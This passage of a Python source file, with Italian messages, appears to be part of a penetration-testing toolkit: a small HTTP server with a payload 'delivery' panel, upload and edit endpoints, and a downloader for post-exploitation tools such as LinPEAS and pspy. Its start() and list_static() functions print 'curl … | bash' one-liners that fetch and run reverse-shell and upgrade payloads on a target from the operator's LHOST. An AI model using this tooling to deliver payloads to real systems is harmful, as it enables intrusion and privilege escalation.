            self._serve_md_page("vuln", "Vuln", VULN_ROOT, path[6:])
        elif path == "/tools":
            self._send_html(_page_list("Tools", "tools", _discover_tools()))
        elif path.startswith("/tools/"):
            self._serve_tool_page(path[7:])
        elif path == "/static":
            self._send_html(_page_static_list())
        elif path.startswith("/static/edit/"):
            name = path[13:]
            if ".." in name or "/" in name:
                self.send_error(403)
            else:
                self._send_html(_page_static_edit(name))
        elif path == "/delivery":
            self._serve_index(pv)
        else:
            self._serve_static(path)

    def _serve_md_page(self, section: str, label: str, root: Path, name: str) -> None:
        if ".." in name or "/" in name:
            self.send_error(403)
            return
        md_file = root / f"{name}.md"
        if not md_file.is_file():
            self.send_error(404, f"Non trovato: {name}")
            return
        md_text = md_file.read_text(encoding="utf-8", errors="replace")
        self._send_html(_page_md(section, label, name, md_text))

    def _serve_tool_page(self, name: str) -> None:
        if ".." in name or "/" in name:
            self.send_error(403)
            return
        tool_dir = TOOL_ROOT / name
        if not tool_dir.is_dir():
            self.send_error(404, f"Tool non trovato: {name}")
            return
        help_f = tool_dir / "help.md"
        if not help_f.exists():
            help_f = tool_dir / "help.txt"
        if not help_f.exists():
            self.send_error(404, f"Nessun help per: {name}")
            return
        md_text = help_f.read_text(encoding="utf-8", errors="replace")
        self._send_html(_page_md("tools", "Tools", name, md_text))

    def _serve_index(self, pv: dict) -> None:
        files = []
        if STATIC_ROOT.is_dir():
            for f in sorted(STATIC_ROOT.iterdir()):
                if f.is_file() and not f.name.startswith("."):
                    size = f.stat().st_size
                    if size > 1_048_576:
                        label = f"{size / 1_048_576:.1f} MB"
                    elif size > 1024:
                        label = f"{size / 1024:.1f} KB"
                    else:
                        label = f"{size} B"
                    base = f"http://{_lhost}:{self.server.server_address[1]}"
                    files.append(
                        f'  <li><a href="/{f.name}"><code>{f.name}</code></a> ({label})'
                        f" — <code>curl {base}/{f.name} -o {f.name}</code></li>"
                    )
        file_list = "\n".join(files) if files else "  <li><em>Nessun file in static/</em></li>"
        base = f"http://{_lhost}:{self.server.server_address[1]}"
        html = INDEX_TEMPLATE.format(base=base, file_list=file_list, **pv)
        self._send_text(html, content_type="text/html")

    def _serve_static(self, path: str) -> None:
        name = path.lstrip("/")
        if ".." in name or name.startswith("/"):
            self.send_error(403)
            return
        target = STATIC_ROOT / name
        if not target.is_file():
            self.send_error(404, f"File non trovato: {name}")
            return
        try:
            data = target.read_bytes()
        except OSError:
            self.send_error(500)
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{target.name}"')
        self.end_headers()
        self.wfile.write(data)

    def _send_json(self, obj: dict, status: int = 200) -> None:
        data = json.dumps(obj).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length)

    def _safe_static_name(self, name: str) -> Path | None:
        if not name or ".." in name or "/" in name or "\\" in name or name.startswith("."):
            return None
        return STATIC_ROOT / name

    def do_POST(self) -> None:
        path = self.path.split("?")[0].rstrip("/")

        if path == "/api/static/save":
            self._api_save()
        elif path == "/api/static/delete":
            self._api_delete()
        elif path == "/api/static/upload":
            self._api_upload()
        else:
            self.send_error(404)

    def _api_save(self) -> None:
        try:
            body = json.loads(self._read_body())
            name = body.get("name", "").strip()
            content = body.get("content", "")
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, 400)
            return
        target = self._safe_static_name(name)
        if target is None:
            self._send_json({"ok": False, "error": "Nome file non valido"}, 400)
            return
        STATIC_ROOT.mkdir(parents=True, exist_ok=True)
        try:
            target.write_text(content, encoding="utf-8")
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True, "name": name})

    def _api_delete(self) -> None:
        try:
            body = json.loads(self._read_body())
            name = body.get("name", "").strip()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, 400)
            return
        target = self._safe_static_name(name)
        if target is None or not target.is_file():
            self._send_json({"ok": False, "error": "File non trovato"}, 404)
            return
        try:
            target.unlink()
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True})

    def _api_upload(self) -> None:
        content_type = self.headers.get("Content-Type", "")
        if "multipart/form-data" not in content_type:
            self._send_json({"ok": False, "error": "Richiesto multipart/form-data"}, 400)
            return
        import cgi
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={"REQUEST_METHOD": "POST",
                     "CONTENT_TYPE": content_type},
        )
        file_item = form["file"] if "file" in form else None
        if file_item is None or not file_item.filename:
            self._send_json({"ok": False, "error": "Nessun file ricevuto"}, 400)
            return
        name = Path(file_item.filename).name
        target = self._safe_static_name(name)
        if target is None:
            self._send_json({"ok": False, "error": "Nome file non valido"}, 400)
            return
        STATIC_ROOT.mkdir(parents=True, exist_ok=True)
        try:
            target.write_bytes(file_item.file.read())
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True, "name": name})


class _QuietTCPServer(socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def start(port: int = 2727, lhost: str | None = None, lport: int = 4444) -> str:
    global _server, _thread, _lhost, _lport

    if _server is not None:
        return f"Server già attivo su porta {_server.server_address[1]}."

    _lhost = lhost or get_default_ip()
    _lport = lport

    try:
        _server = _QuietTCPServer(("", port), SlRequestHandler)
    except OSError as exc:
        return f"Impossibile avviare il server sulla porta {port}: {exc}"

    _thread = threading.Thread(target=_server.serve_forever, daemon=True)
    _thread.start()

    base = f"http://{_lhost}:{port}"
    out = [
        f"Server attivo su \033[92m{base}\033[0m  "
        f"(LHOST={_lhost}  LPORT={_lport})",
        "",
        f"  \033[96mSLWeb:\033[0m            {base}",
        f"  \033[96mDelivery panel:\033[0m   {base}/delivery",
        "",
        f"  curl {base}/upgrade | bash",
        f"  curl {base}/rev | bash",
        f"  curl {base}/sh | bash",
    ]
    if STATIC_ROOT.is_dir():
        static_files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
        if static_files:
            out.append("")
            for f in static_files:
                name = f.name
                if name.endswith(".sh"):
                    out.append(f"  curl {base}/{name} | bash")
                elif name.endswith(".exe"):
                    out.append(f"  curl {base}/{name} -o {name}")
                else:
                    out.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
    return "\n".join(out)


def stop() -> str:
    global _server, _thread
    if _server is None:
        return "Nessun server attivo."
    _server.shutdown()
    _server.server_close()
    _server = None
    _thread = None
    return "Server arrestato."


def is_running() -> bool:
    return _server is not None


def status() -> str:
    if _server is None:
        return "Server non attivo."
    port = _server.server_address[1]
    return f"Server attivo su http://{_lhost}:{port}  (LHOST={_lhost}  LPORT={_lport})"


# ---------------------------------------------------------------------------
# Catalogo tool di post-exploitation da scaricare in static/
# ---------------------------------------------------------------------------

TOOL_CATALOG: list[dict[str, str]] = [
    {
        "name": "linpeas.sh",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
        "desc": "LinPEAS — Linux Privilege Escalation",
    },
    {
        "name": "winPEASx64.exe",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe",
        "desc": "WinPEAS x64 — Windows Privilege Escalation",
    },
    {
        "name": "winPEASx86.exe",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe",
        "desc": "WinPEAS x86 — Windows Privilege Escalation",
    },
    {
        "name": "pspy64",
        "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
        "desc": "pspy — monitor processi senza root",
    },
    {
        "name": "pspy32",
        "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
        "desc": "pspy — monitor processi senza root (32bit)",
    },
    {
        "name": "linpeas_linux_amd64",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64",
        "desc": "LinPEAS binario statico — no bash/sh necessario",
    },
    {
        "name": "linux-exploit-suggester.sh",
        "url": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
        "desc": "Linux Exploit Suggester — suggerisce exploit kernel",
    },
    {
        "name": "linenum.sh",
        "url": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
        "desc": "LinEnum — enumerazione Linux classica",
    },
]


def _download_file(url: str, dest: Path) -> bool:
    try:
        subprocess.run(
            ["curl", "-sL", "--fail", "-o", str(dest), url],
            timeout=120, check=True,
        )
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        pass
    try:
        subprocess.run(
            ["wget", "-q", "-O", str(dest), url],
            timeout=120, check=True,
        )
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False


def fetch_tools(force: bool = False) -> str:
    STATIC_ROOT.mkdir(parents=True, exist_ok=True)
    lines: list[str] = []
    ok = 0
    skip = 0
    fail = 0

    for entry in TOOL_CATALOG:
        dest = STATIC_ROOT / entry["name"]
        if dest.exists() and not force:
            skip += 1
            lines.append(f"  \033[90m[skip]\033[0m {entry['name']}  (già presente)")
            continue
        print(f"  \033[93m[download]\033[0m {entry['name']}...")
        if _download_file(entry["url"], dest):
            size = dest.stat().st_size
            if size > 1_048_576:
                label = f"{size / 1_048_576:.1f} MB"
            else:
                label = f"{size / 1024:.1f} KB"
            ok += 1
            lines.append(f"  \033[92m[ok]\033[0m {entry['name']}  ({label})")
        else:
            fail += 1
            lines.append(f"  \033[91m[errore]\033[0m {entry['name']}  — download fallito")
            if dest.exists():
                dest.unlink()

    summary = f"\nRisultato: {ok} scaricati, {skip} già presenti, {fail} errori"
    lines.append(summary)
    lines.append(f"Cartella: {STATIC_ROOT}")
    return "\n".join(lines)


def list_static() -> str:
    if not STATIC_ROOT.is_dir():
        return "Cartella static/ non trovata."
    files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
    if not files:
        return "Nessun file in static/. Usa 'serve fetch' per scaricare i tool."
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:2727"
    lines = [f"\nFile in static/ ({len(files)}):"]
    for f in files:
        name = f.name
        if name.endswith(".sh"):
            lines.append(f"  curl {base}/{name} | bash")
        elif name.endswith(".exe"):
            lines.append(f"  curl {base}/{name} -o {name}")
        else:
            lines.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
    return "\n".join(lines)
